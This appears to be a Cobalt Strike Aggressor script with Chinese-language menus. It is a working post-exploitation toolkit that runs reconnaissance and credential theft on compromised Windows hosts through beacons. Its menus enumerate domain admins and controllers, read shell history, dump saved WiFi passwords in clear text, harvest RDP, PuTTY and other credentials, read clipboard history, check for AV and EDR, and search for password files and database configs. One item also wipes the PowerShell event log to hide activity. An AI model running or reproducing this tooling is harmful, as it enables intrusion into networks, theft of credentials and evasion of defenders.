##############################
#                            #
#                            #
#                            #
#       xway.cn@panda8       #
#       secquan.org@panda8   #
#		t00ls.com@panda8     #
#                            #
#                            #
#                            #
##############################
menu "信息收集" {

        item "常用信息"{
            $bid = $1['@'];
            $dialog = dialog("常用信息",%(bid => $bid), &main);
            dialog_description($dialog, "常用信息收集");
            drow_checkbox($dialog, "QQ", "获取登录的QQ", "");
            drow_checkbox($dialog, "SharpChassisType", "获取当前主机类型", "");
            drow_checkbox($dialog, "cmd", "查看cmd历史命令", "");
            drow_checkbox($dialog, "powershell", "查看powershell历史命令", "");
            drow_checkbox($dialog, "recenttest", "查看文件浏览历史", "");
            drow_checkbox($dialog, "recent_ladon", "查看文件浏览历史-ladon", "");
            drow_checkbox($dialog, "smb", "查看SMB指向路径", "");
            drow_checkbox($dialog, "brief", "查看安装程序和版本信息", "");
            drow_checkbox($dialog, "hotfixid", "查看安装的补丁", "");
            drow_checkbox($dialog, "process", "查看运行进程", "");
            drow_checkbox($dialog, "processid", "查看进程详细", "");
            drow_checkbox($dialog, "start", "查看服务", "");
            drow_checkbox($dialog, "firewall", "查看防火墙配置", "");
            drow_checkbox($dialog, "schtasks_exe", "查看计划任务", "");
            drow_checkbox($dialog, "schtasks", "查看计划任务详情", "");
            drow_checkbox($dialog, "workstation", "查看开机时间", "");
            drow_checkbox($dialog, "startup", "查看启动项", "");
            drow_checkbox($dialog, "qwinsta", "查看在线用户", "");
            drow_checkbox($dialog, "GetIP", "查看本机内网与外网IP", "");
            dbutton_action($dialog, "运行");
            dialog_show($dialog);
        }
		

        item "内网信息"{
            $bid = $1['@'];
            $dialog = dialog("内网信息",%(bid => $bid), &neiwang);
            dialog_description($dialog, "内网信息收集");
            drow_checkbox($dialog, "view_domain", "查询域", "");
            drow_checkbox($dialog, "domainadmin", "查看域管", "");
            drow_checkbox($dialog, "route_print", "查看路由表", "");
            drow_checkbox($dialog, "domain_sid", "查看域SID", "");
            drow_checkbox($dialog, "domain_user", "查看指定域用户详细信息", "");
            drow_checkbox($dialog, "domain_workstation", "查看当前登录域", "");
            drow_checkbox($dialog, "domain_time", "判断主域", "");
            drow_checkbox($dialog, "domain_computer", "查看域内所有计算机", "");
            drow_checkbox($dialog, "domain_group", "查看域内所有用户组列表", "");
            drow_checkbox($dialog, "domain_computers", "查看所有域成员计算机列表", "");
            drow_checkbox($dialog, "domain_accounts", "获取域密码信息", "");
            drow_checkbox($dialog, "domain_trusts", "获取域信任信息", "");
            drow_checkbox($dialog, "domain_dcname", "查看域控机器名", "");
            drow_checkbox($dialog, "domain_dcldap", "查看域控主机名", "");
            drow_checkbox($dialog, "domain_dcgroup", "查看域控列表", "");
            drow_checkbox($dialog, "domain_dcdc", "查看主域控制器", "");
            drow_checkbox($dialog, "domain_dcuser", "查看所有域用户", "");
            drow_checkbox($dialog, "domain_dcuserwmi", "查看所有域用户详细信息", "");
            drow_checkbox($dialog, "domain_dcadministrators", "查看登录本机的域管", "");
            drow_checkbox($dialog, "domain_online", "查看同一域内在线机器列表", "");
            dbutton_action($dialog, "运行");
            dialog_show($dialog);
        }

sub main{
    foreach $func (keys($3)){
        if ($3[$func] eq 'true'){
            eval($func.'();');
        }
    }

}

sub neiwang{
    foreach $func (keys($3)){
        if ($3[$func] eq 'true'){
            eval($func.'();');
        }
    }

}

sub QQ{
    btask($bid, "####################", "");
    btask($bid, "##  获取登录的QQ   ##", "");
	btask($bid, "####################", "");
    bshell($bid, "dir \\\\.\\pipe\\\\ | findstr \"QQ_\" | findstr \"_pipe\"");
}

sub SharpChassisType{
    btask($bid, "########################", "");
    btask($bid, "##  获取当前主机类型   ##", "");
	btask($bid, "########################", "");
    bexecute_assembly($bid, script_resource("/script/SharpChassisType.exe"), "");
}

sub cmd{
    btask($bid, "########################", "");
    btask($bid, "##  查看cmd历史命令    ##", "");
	btask($bid, "########################", "");
    bshell($bid, "doskey /history");
}

sub powershell{
    btask($bid, "#############################", "");
    btask($bid, "##  查看powershell历史命令  ##", "");
	btask($bid, "#############################", "");
    bshell($bid, "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt");
}

sub recenttest{
    btask($bid, "#######################", "");
    btask($bid, "##  查看文件浏览历史  ##", "");
	btask($bid, "#######################", "");
    bshell($bid, "dir %APPDATA%\\Microsoft\\Windows\\Recent");
}

sub recent_ladon{
    btask($bid, "#######################", "");
    btask($bid, "##  查看文件浏览历史  ##", "");
	btask($bid, "#######################", "");
    bexecute_assembly($bid, script_resource("/script/Ladon.exe"), "Recent");
}

sub smb{
    btask($bid, "########################", "");
    btask($bid, "##  查看SMB指向路径    ##", "");
	btask($bid, "########################", "");
    bshell($bid, "wmic share get name,path");
}

sub brief{
    btask($bid, "#############################", "");
    btask($bid, "##  查看安装程序和版本信息  ##", "");
	btask($bid, "#############################", "");
    bshell($bid, "wmic product get name,version");
}

sub hotfixid{
    btask($bid, "#####################", "");
    btask($bid, "##  查看安装的补丁  ##", "");
	btask($bid, "#####################", "");
    bshell($bid, "wmic qfe get Caption,Description,HotFixID,InstalledOn");
}

sub process{
    btask($bid, "#####################", "");
    btask($bid, "##  查看运行的进程  ##", "");
	btask($bid, "#####################", "");
    bshell($bid, "wmic process get caption,executablepath,commandline");
}

sub processid{
    btask($bid, "###################", "");
    btask($bid, "##  查看进程详细  ##", "");
	btask($bid, "###################", "");
    bshell($bid, "wmic process get caption,commandline,processid /value");
}

sub start{
    btask($bid, "###############", "");
    btask($bid, "##  查看服务  ##", "");
	btask($bid, "###############", "");
    bshell($bid, "wmic service list brief");
}

sub firewall{
    btask($bid, "#####################", "");
    btask($bid, "##  查看防火墙配置  ##", "");
	btask($bid, "#####################", "");
    bshell($bid, "netsh firewall show config");
}

sub schtasks_exe{
    btask($bid, "###################", "");
    btask($bid, "##  查看计划任务  ##", "");
	btask($bid, "###################", "");
    bshell($bid, "schtasks.exe");
}

sub schtasks{
    btask($bid, "#######################", "");
    btask($bid, "##  查看计划任务详情  ##", "");
	btask($bid, "#######################", "");
    bshell($bid, "schtasks /query /fo LIST /v");
}

sub workstation{
    btask($bid, "###################", "");
    btask($bid, "##  查看开机时间  ##", "");
	btask($bid, "###################", "");
    bshell($bid, "net statistics workstation");
}

sub startup{
    btask($bid, "#######################", "");
    btask($bid, "##  查看启动程序信息  ##", "");
	btask($bid, "#######################", "");
    bshell($bid, "wmic startup get command,caption");
}

sub qwinsta{
    btask($bid, "###################", "");
    btask($bid, "##  查看在线用户  ##", "");
	btask($bid, "###################", "");
    bshell($bid, "query user || qwinsta");
}

sub GetIP{
    btask($bid, "##############################", "");
    btask($bid, "##  查看本机内网IP与外网IP  ##", "");
	btask($bid, "##############################", "");
    bexecute_assembly($bid, script_resource("/script/Ladon.exe"), "GetIP");
}


######################################################################################################################

sub view_domain{
    btask($bid, "##############", "");
    btask($bid, "##  查询域  ##", "");
	btask($bid, "##############", "");
    bshell($bid, "net view /domain");
}

sub domainadmin{
    btask($bid, "###############", "");
    btask($bid, "##  查看域管  ##", "");
	btask($bid, "###############", "");
    bshell($bid, "net group \"domain admins\" /domain");
}

sub route_print{
    btask($bid, "#################", "");
    btask($bid, "##  查看路由表  ##", "");
	btask($bid, "#################", "");
    bshell($bid, "route print");
}

sub domain_sid{
    btask($bid, "#################", "");
    btask($bid, "##  查看路由表  ##", "");
	btask($bid, "#################", "");
    bshell($bid, "whoami /all");
}

sub domain_user{
    btask($bid, "#########################", "");
    btask($bid, "##  查看域用户详细信息  ##", "");
	btask($bid, "#########################", "");
    prompt_text("输入域用户名", "", lambda({
    bshell(@bid, "net user $1 /domain");
        }, @bid => $bid));
}

sub domain_workstation{
    btask($bid, "#####################", "");
    btask($bid, "##  查看当前登录域  ##", "");
	btask($bid, "#####################", "");
    bshell($bid, "net config workstation");
}

sub domain_time{
    btask($bid, "####################################################", "");
    btask($bid, "##  判断主域,域服务器通常会同时作为时间服务器使用  ##", "");
	btask($bid, "####################################################", "");
    bshell($bid, "net time /domain");
}

sub domain_computer{
    btask($bid, "#########################", "");
    btask($bid, "##  查看域内所有计算机  ##", "");
	btask($bid, "#########################", "");
    prompt_text("输入主机名", "", lambda({
    bshell(@bid, "net view /domain:$1");
        }, @bid => $bid));
}

sub domain_group{
    btask($bid, "##############################", "");
    btask($bid, "##  查看域内所有用户组列表  ##", "");
	btask($bid, "##############################", "");
    bshell($bid, "net group /domain");
}

sub domain_computers{
    btask($bid, "##############################", "");
    btask($bid, "##  查看所有域成员计算机列表  ##", "");
	btask($bid, "##############################", "");
    bshell($bid, "net group \"domain computers\" /domain");
}

sub domain_accounts{
    btask($bid, "######################", "");
    btask($bid, "##  获取域密码信息  ##", "");
	btask($bid, "######################", "");
    bshell($bid, "net accounts /domain");
}

sub domain_trusts{
    btask($bid, "######################", "");
    btask($bid, "##  获取域信任信息  ##", "");
	btask($bid, "######################", "");
    bshell($bid, "nltest /domain_trusts");
}

sub domain_dcname{
    btask($bid, "######################", "");
    btask($bid, "##  查看域控机器名  ##", "");
	btask($bid, "######################", "");
    prompt_text("输入主机名", "", lambda({
    bshell(@bid, "nltest /DCLIST:$1");
        }, @bid => $bid));
}

sub domain_dcldap{
    btask($bid, "######################", "");
    btask($bid, "##  查看域控主机名  ##", "");
	btask($bid, "######################", "");
    bshell($bid, "Nslookup -type=SRV _ldap._tcp");
}

sub domain_dcgroup{
    btask($bid, "####################", "");
    btask($bid, "##  查看域控列表  ##", "");
	btask($bid, "####################", "");
    bshell($bid, "net group \"Domain Controllers\" /domain");
}

sub domain_dcdc{
    btask($bid, "######################", "");
    btask($bid, "##  查看主域控制器  ##", "");
	btask($bid, "######################", "");
    bshell($bid, "netdom query pdc");
}

sub domain_dcuser{
    btask($bid, "######################", "");
    btask($bid, "##  查看所有域用户  ##", "");
	btask($bid, "######################", "");
    bshell($bid, "net user /domain");
}

sub domain_dcuserwmi{
    btask($bid, "##############################", "");
    btask($bid, "##  查看所有域用户详细信息  ##", "");
	btask($bid, "##############################", "");
    bshell($bid, "wmic useraccount get /all");
}

sub domain_dcadministrators{
    btask($bid, "##########################", "");
    btask($bid, "##  查看登录本机的域管  ##", "");
	btask($bid, "##########################", "");
    bshell($bid, "net localgroup administrators /domain");
}

sub domain_online{
    btask($bid, "################################", "");
    btask($bid, "##  查看同一域内在线机器列表  ##", "");
	btask($bid, "################################", "");
    bshell($bid, "net view");
}





    menu "查看mstsc记录"{
					item "获取RDP登录记录"{
				bexecute_assembly($1, script_resource('/script/ListRDPConnections.exe'), "");
            }
	            item "查看所有用户的记录"{
                $bid = $1['@'];
                $Dialog = dialog("listlog",%(bid => $bid),&listlogs);
                dialog_description($Dialog, "Mstsc");
                dbutton_action($Dialog, "运行");
                dialog_show($Dialog);
            }
sub listlogs {
	local('$script');

	$oneliner = beacon_host_script($bid);

	bpowershell_import!($bid, script_resource("/script/ListAllUsers.ps1"));
	bpowerpick!($bid, "\" $+ $oneliner $+ \"");

	bpause($bid, 10000);

}

	            item "查看已登录用户的记录"{
                $bid = $1['@'];
                $Dialog = dialog("listlog",%(bid => $bid),&listlog);
                dialog_description($Dialog, "Mstsc");
                dbutton_action($Dialog, "运行");
                dialog_show($Dialog);
            }
				item "查看RDP记录-Ladon"{
				bexecute_assembly($1, script_resource('/script/Ladon.exe'), "RdpLog");
            }
				item "获取RDP与putty信息"{
				bexecute_assembly($1, script_resource('/script/SessionSearcher.exe'), "");
            }

}
sub listlog {
	local('$script');


	$oneliner = beacon_host_script($bid);

	bpowershell_import!($bid, script_resource("/script/ListLogged-inUsers.ps1"));
	bpowerpick!($bid, "\" $+ $oneliner $+ \"");

	bpause($bid, 10000);

}
			
			
menu "一键获取信息-Seatbelt" {
			item "命令行返回结果" {
			$bid = $1;
			$dialog = dialog("一键获取信息-Seatbelt", %(Type => "all -full",bid => $bid), &Seatbelt);
			dialog_description($dialog, "一键获取信息。");
			drow_combobox($dialog, "Type", "Type:", @("all -full", "system -full","user -full","misc -full","Slack -full","Chrome -full","Remote -full"));
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub Seatbelt {

		$arg = join('', @("-group=",$3['Type']));
		bexecute_assembly($bid, script_resource("/script/Seatbelt.exe"), $arg);
}

			item "输出结果到txt" {
			$bid = $1['@'];
			$dialog = dialog("一键获取信息-Seatbelt", %(Type => "all -full",path => "C:\\windows\\Temp\\123.txt",bid => $bid), &Seatbelt_txt);
			dialog_description($dialog, "一键获取信息,输出结果到txt。");
			drow_text($dialog, "path", "path:  ");			
			drow_combobox($dialog, "Type", "Type", @("all -full", "system -full","user -full","misc -full","Slack -full","Chrome -full","Remote -full"));
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub Seatbelt_txt {
		bexecute_assembly($bid, script_resource("/script/Seatbelt.exe"), "-group=$3['Type'] -outputfile=\"$3['path']\"");

		}
		}

menu "获取主机相关信息" {
				item "一键获取主机信息"{
				bexecute_assembly($1, script_resource('/script/Ladon.exe'), "GetInfo");
            }

				item "显示所有网络接口"{
				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-NetIPAddress -All");
            }

				item "显示IP路由表"{
				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-NetRoute");
            }

				item "列出ARP缓存"{
				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-NetNeighbor");
            }

				item "列出共享"{
				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-SmbMapping");
            }
			
				item "显示网络接口"{
				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-NetIPAddress");
            }

				item "列出本地驱动器"{
				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-PSDrive");
            }

				item "列出安装的补丁"{
				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-HotFix");
            }

				item "查看注册表自启动项"{
				bexecute_assembly($1, script_resource('/script/NoPowerShell.exe'), "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run | ft");
            }


}

menu "获取域相关信息" {

				item "获取远程主机信息" {
				$bid = $1['@'];
				$dialog = dialog("获取远程主机信息", %(target => "COMPUTERNAME|IPADDRESS",bid => $bid), &scout);
				dialog_description($dialog, "参数为computername或者ip");
				drow_text($dialog, "target", "target:  ");	
				dbutton_action($dialog, "运行");
				dialog_show($dialog);
       }
sub scout {
	$arg = join(' ', @($3['target']));
	bexecute_assembly($bid, script_resource("/script/scout.exe"), $arg);
}

				item "枚举域信息" {
				$bid = $1;
				blog($bid, "Let's enumerate the Recon-AD-Domain\n");
				bdllspawn($bid, script_resource("/script/Recon-AD-Domain.dll"), "", "Recon-AD-Domain", 5000, false);
			}

		    	item "获取域密码策略与域用户数"{
				bexecute_assembly($1, script_resource('/script/SharpSpray1.exe'), "--action GET_POLICIES");
    	}

			item "查询所有本地组和组成员" {
			$bid = $1['@'];
			$dialog = dialog("查询所有本地组和组成员", %(computername => "win7/win7.sun.com",bid => $bid), &Recon-AD-AllLocalGroups);
			dialog_description($dialog, "输入计算机名,用于在特定计算机上查询所有本地组");
			drow_text($dialog, "computername", "computername:  ");	
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub Recon-AD-AllLocalGroups {
		blog($bid, "Let's enumerate the $3['computername']\n");
		bdllspawn($bid, script_resource("/script/Recon-AD-AllLocalGroups.dll"), "$3['computername']", "Recon-AD-AllLocalGroups", 5000, false);	
}

			item "查询计算机对象和相应的属性" {
			$bid = $1['@'];
			$dialog = dialog("查询计算机对象和相应的属性", %(type => "computername/*dc*/All",bid => $bid), &Recon-AD-Computers);
			dialog_description($dialog, "[计算机名],用于查询包括属性的特定计算机对象,[*dc*],以查询包含dc的计算机名称,[All],查询所有计算机对象包括属性");
			drow_text($dialog, "type", "type:  ");	
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub Recon-AD-Computers {
		blog($bid, "Let's enumerate the $3['type']\n");
		bdllspawn($bid, script_resource("/script/Recon-AD-Computers.dll"), "$3['type']", "Recon-AD-Computers", 5000, false);	
}

			item "查询组对象和相应的属性" {
			$bid = $1['@'];
			$dialog = dialog("查询组对象和相应的属性", %(type => "groupname/*admin*/All",bid => $bid), &Recon-AD-Groups);
			dialog_description($dialog, "[groupname],用于查询包含属性的特定组对象,[*admin*],以查询包含admin的组名,[All],查询包括属性在内的所有组对象");
			drow_text($dialog, "type", "type:  ");	
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub Recon-AD-Groups {
		blog($bid, "Let's enumerate the $3['type']\n");
		bdllspawn($bid, script_resource("/script/Recon-AD-Groups.dll"), "$3['type']", "Recon-AD-Groups", 5000, false);	
}

			item "查询特定的计算机和本地组" {
			$bid = $1['@'];
			$dialog = dialog("查询组对象和相应的属性", %(computername => "win7.sun.com",groupname => "administrators",bid => $bid), &Recon-AD-LocalGroups);
			dialog_description($dialog, "[groupname],在计算机上查询特定的本地组和组成员(默认的Administrators组)");
			drow_text($dialog, "computername", "computername:  ");
			drow_text($dialog, "groupname", "groupname:  ");
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub Recon-AD-LocalGroups {
		blog($bid, "Let's enumerate the $3['computername']\n");
		bdllspawn($bid, script_resource("/script/Recon-AD-LocalGroups.dll"), "$3['computername']", "$3['groupname']", "Recon-AD-LocalGroups", 5000, false);	
}

			item "查询配置了SPN用户对象" {
			$bid = $1;
			blog($bid, "Let's enumerate the Recon-AD-SPNs\n");
			bdllspawn($bid, script_resource("/script/Recon-AD-SPNs.dll"), "", "Recon-AD-SPNs", 5000, false);
			}

			item "查询用户对象和相应的属性" {
			$bid = $1['@'];
			$dialog = dialog("查询用户对象和相应的属性", %(type => "username/*admin*/All",bid => $bid), &Recon-AD-Users);
			dialog_description($dialog, "[username]用于查询包括属性的特定用户对象,[*admin*]查询包含admin的用户名[All]查询所有用户对象,包括属性");
			drow_text($dialog, "type", "type:  ");	
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub Recon-AD-Users {
		blog($bid, "Let's enumerate the $3['type']\n");
		bdllspawn($bid, script_resource("/script/Recon-AD-Users.dll"), "$3['type']", "Recon-AD-Users", 5000, false);	
}
}

menu "获取WIFI相关信息" {
				item "获取连接过的WIFI" {
			local('$bid');
			foreach $bid ($1){
				bshell($1, "netsh wlan show profiles");
			}
		}
			    item "获取WIFI密码" {
             prompt_text("输入SSID", "", lambda({
            bshell(@ids, "netsh wlan show profile name=\"$1\" key=clear");
        }, @ids => $1));
    }

				item "一键获取连接过的WIFI信息"{
				bexecute_assembly($1, script_resource('/script/SharpWifiGrabber.exe'), "");
            }

				item "获取周围的WIFI热点" {
			local('$bid');
			foreach $bid ($1){
				bshell($1, "netsh wlan show networks mode=bssid");
			}
		}
			

}
			
				item "获取凭证相关信息-Gopher"{
				bexecute_assembly($1, script_resource('/script/Gopher.exe'), "");
    	}
				item "获取.net&&powershell版本"{
				bexecute_assembly($1, script_resource('/script/Ladon.exe'), "NetVer");
            }

				item "获取主机命名管道"{
				bexecute_assembly($1, script_resource('/script/Ladon.exe'), "GetPipe");
            }

menu "获取系统登录日志" {
	        item "获取系统登录日志-1" {
			$bid = $1;
			$dialog = dialog("SharpEventLog", %(EventLogType => "-4624",bid => $bid), &SharpEventLog);
			dialog_description($dialog, "获取Windows登录事件日志：读取登录过本机的登录失败或登录成功（4624,4625）的所有计算机信息，在内网渗透中快速定位运维管理人员。");
			drow_combobox($dialog, "EventLogType", "EventLog Type:", @("-4624", "-4625"));
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub SharpEventLog {
	bexecute_assembly($bid, script_resource("/script/SharpEventLog.exe"), $3['EventLogType']);
}

				item "获取系统登录日志-2" {
                local('$bid');
                foreach $bid ($1){
                    blog($1, "Get RDP TerminalServices LocalSessionManager EventLog (ID=21&22&24&25)");
                    bpowershell_import($bid, script_resource("/script/LocalSessionManager.ps1"));
                    bpowerpick($bid,"LocalSessionManager");
                    bshell($bid,"wevtutil cl \"Windows PowerShell\"");
                }
            }
				}

			item "获取回收站等信息" {
			$bid = $1;
			$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
			dialog_description($dialog, "收集目标主机信息，包括最近打开的文件，系统环境变量和回收站文件等等。");
			drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub SharpCheckInfo {
    btask($bid, "###############################################", "");
    btask($bid, "##  EnvironmentalVariables-环境变量          ##", "");
	btask($bid, "##  GetRecycle-获取回收站文件名              ##", "");
	btask($bid, "##  AllUserDirectories-当前用户和特权        ##", "");
	btask($bid, "##  PowershellInfo-powershell相关            ##", "");
	btask($bid, "##  CsharpVersion-已安装的Microsoft.NET版本  ##", "");
	btask($bid, "##  AvProcessEDRproduct-EDV/AV产品           ##", "");
	btask($bid, "##  Defender-Windows Defender排除项          ##", "");
	btask($bid, "##  RecentFiles-最近访问的文件               ##", "");	
	btask($bid, "##  NetworkConnentions-当前网络连接          ##", "");	
	btask($bid, "##  ApplockerEnumerating-AppLocker           ##", "");	
	btask($bid, "##  LAPS-Existance of LAPS                   ##", "");	
	btask($bid, "###############################################", "");
	bexecute_assembly($bid, script_resource("/script/SharpCheckInfo.exe"), $3['Type']);
}
			item "获取数据库数据" {
			$bid = $1['@'];
			$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
			dialog_description($dialog, "内网渗透中快速获取数据库所有库名，表名，列名。具体判断后再去翻数据，节省时间。适用于mysql，mssql。");
			drow_text($dialog, "host", "host:  ");	
			drow_text($dialog, "username", "username:  ");	
			drow_text($dialog, "password", "password:  ");			
			drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub SharpSQLDump {
		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
		bexecute_assembly($bid, script_resource("/script/SharpSQLDump.exe"), $arg);
}	
menu "获取剪切板信息" {
		item "开启剪切板记录" {
			bexecute_assembly($1, script_resource("/script/SharpClipHistory.exe"), "--enableHistory");
		}

		item "获取剪切板信息" {
			bexecute_assembly($1, script_resource("/script/SharpClipHistory.exe"), "");
		}
		}
		

	        item "获取杀软信息" {
			$bid = $1;
			$dialog = dialog("SharpAVKB", %(type => "-AV",bid => $bid), &SharpAVKB);
			dialog_description($dialog, "Windows杀软对比和补丁号对比。");
			drow_combobox($dialog, "type", "type:", @("-AV", "-KB"));
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub SharpAVKB {
	bexecute_assembly($bid, script_resource("/script/SharpAVKB.exe"), $3['type']);
}

			item "获取EDR信息" {
			bexecute_assembly($1, script_resource("/script/SharpEDRChecker.exe"), "");
		}

			item "获取文件目录结构"{
				$bid = $1;
				$dialog = dialog("SharpDirLister", %(filepath => "C:\\windows\\temp",outpath => "C:\\windows\\Temp",bid => $bid), &SharpDirLister);
				dialog_description($dialog, "输出驱动器的完整目录/文件列表，最后将其压缩为.gz");
				drow_text($dialog, "filepath", "目录路径:  ");	
				drow_text($dialog, "outpath", "输出路径:  ");					
				dbutton_action($dialog, "运行");
				dialog_show($dialog);
        }
sub SharpDirLister {
	$arg = join(' ', @($3['filepath'],$3['outpath']));
	bexecute_assembly($bid, script_resource("/script/SharpDirLister.exe"), $arg);
}

				item "查找数据库配置文件" {
				$bid = $1['@'];
				$dialog = dialog("查找数据库配置文件", %(path => "c:\\www\\html",Keyword => "DBPath",bid => $bid), &sql_path);
				dialog_description($dialog, "要查找数据库配置文件,首先得输入一个配置文件里的关键字符,通过读取文件里的关键字符来查找配置文件");
				drow_text($dialog, "path",  "网站路径: "); 
				drow_text($dialog, "Keyword",  "关键字符: "); 
				dbutton_action($dialog, "运行");
				dialog_show($dialog);
        }
sub sql_path{
	bcd($bid, "$3['path']");
	bshell($bid, "findstr /s /i \"$3['Keyword']\" *.*");
} 
		
			item "文件搜索" {
			$bid = $1['@'];
			$dialog = dialog("文件搜索", %(path => "C:\\",file => "payload.exe||passwords*||*.txt",bid => $bid), &SharpDir);
			dialog_description($dialog, "文件搜索,三种搜索方式，指定文件名、制定文件名搜索后缀、搜索指定后缀文件。");
			drow_text($dialog, "path", "path:  ");	
			drow_text($dialog, "file", "file:  ");	
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub SharpDir {
		$arg = join(' ', @($3['path'],$3['file']));
		bexecute_assembly($bid, script_resource("/script/SharpDir.exe"), $arg);
}

		menu "web页面截图" {
			item "上传scrying" {
				$bid = $1;
				$dialog = dialog("上传scrying与targets", %(UploadPath => "C:\\Windows\\Temp\\", bid => $bid), &scrying_upload);	
				drow_text($dialog, "UploadPath",  "上传路径: "); 
				drow_file($dialog, "targets", "targets.txt: ");
				dbutton_action($dialog, "上传");
				dialog_show($dialog);
        }
sub scrying_upload {
		bcd($bid, $3['UploadPath']);
        bupload($bid, script_resource("/script/scrying.exe"));
		bupload($bid, $3['targets']);		
    }

            item "运行scrying"{
                    $bid = $1['@'];
                    $Dialog = dialog("运行hack-browser-data",%(targets => "targets.txt",bid => $bid),&scrying_run);
                    dialog_description($Dialog, "截图目标web、rdp、vnc服务页面,targets.txt表明http,例如http://123.com,运行完毕在当前目录生成output文件夹");
					drow_text($Dialog, "targets", "targets: ");
                    dbutton_action($Dialog, "运行");
                    dialog_show($Dialog);
                }

sub scrying_run{
	local('$targets');
    $targets = $3['targets'];
	bshell($bid, "scrying.exe -f  $+ $targets");
}

			item "停止scrying"{
			local('$bid');
			foreach $bid ($1){
				bshell($1, "taskkill -f /im scrying.exe");
			}
		}
		
        	item "删除scrying"{
        	local('$bid');
        	foreach $bid ($1){
            	bshell($1, "del /f /s /q scrying.exe");
        	}
		}
	
	}
	
menu "读取excel文件内容"{
			item "查看excel文件是否设置了密码" {
			$bid = $1['@'];
			$dialog = dialog("检测excel文件是否设置了密码", %(filepath => "C:\\123.xlsx",bid => $bid), &SharpExcelibur_check);
			dialog_description($dialog, "检测excel文件是否设置了密码");
			drow_text($dialog, "filepath", "filepath:  ");	
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub SharpExcelibur_check {
		$arg = join(' ', @("check",$3 ['filepath']));
		bexecute_assembly($bid, script_resource("/script/SharpExcelibur.exe"), $arg);
}

			item "查看excel文件工作表名(无密码)" {
			$bid = $1['@'];
			$dialog = dialog("检测excel文件工作表名", %(filepath => "C:\\123.xlsx",bid => $bid), &SharpExcelibur_sheet_check);
			dialog_description($dialog, "检测excel文件工作表名");
			drow_text($dialog, "filepath", "filepath:  ");	
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub SharpExcelibur_sheet_check {
		$arg = join(' ', @("sheets",$3 ['filepath']));
		bexecute_assembly($bid, script_resource("/script/SharpExcelibur.exe"), $arg);
}

			item "查看excel文件工作表名(有密码)" {
			$bid = $1['@'];
			$dialog = dialog("检测excel文件工作表名", %(filepath => "C:\\123.xlsx",passwd => "",bid => $bid), &SharpExcelibur_sheet_check_pass);
			dialog_description($dialog, "检测excel文件工作表名");
			drow_text($dialog, "filepath", "filepath:  ");
			drow_text($dialog, "passwd", "passwd:  ");
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub SharpExcelibur_sheet_check_pass {
		$arg = join(' ', @("sheets",$3 ['passwd'],$3 ['filepath']));
		bexecute_assembly($bid, script_resource("/script/SharpExcelibur.exe"), $arg);
}

			item "读取excel文件内容(无密码)" {
			$bid = $1['@'];
			$dialog = dialog("读取excel文件内容(无密码)", %(filepath => "C:\\123.xlsx",sheetname => "",bid => $bid), &SharpExcelibur_sheet_read);
			dialog_description($dialog, "读取excel文件内容(无密码)");
			drow_text($dialog, "filepath", "filepath:  ");
			drow_text($dialog, "sheetname", "sheetname:  ");
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub SharpExcelibur_sheet_read {
		$arg = join(' ', @("read",$3 ['sheetname'],$3 ['filepath']));
		bexecute_assembly($bid, script_resource("/script/SharpExcelibur.exe"), $arg);
}

			item "读取excel文件内容(有密码)" {
			$bid = $1['@'];
			$dialog = dialog("读取excel文件内容(有密码)", %(filepath => "C:\\123.xlsx",sheetname => "",passwd => "",bid => $bid), &SharpExcelibur_sheet_read);
			dialog_description($dialog, "读取excel文件内容(有密码)");
			drow_text($dialog, "filepath", "filepath:  ");
			drow_text($dialog, "sheetname", "sheetname:  ");
			drow_text($dialog, "passwd", "passwd:  ");
            dbutton_action($dialog, "运行");
			dialog_show($dialog);
        }
sub SharpExcelibur_sheet_read {
		$arg = join(' ', @("read",$3 ['sheetname'],$3 ['passwd'],$3 ['filepath']));
		bexecute_assembly($bid, script_resource("/script/SharpExcelibur.exe"), $arg);
}

}





	
	}
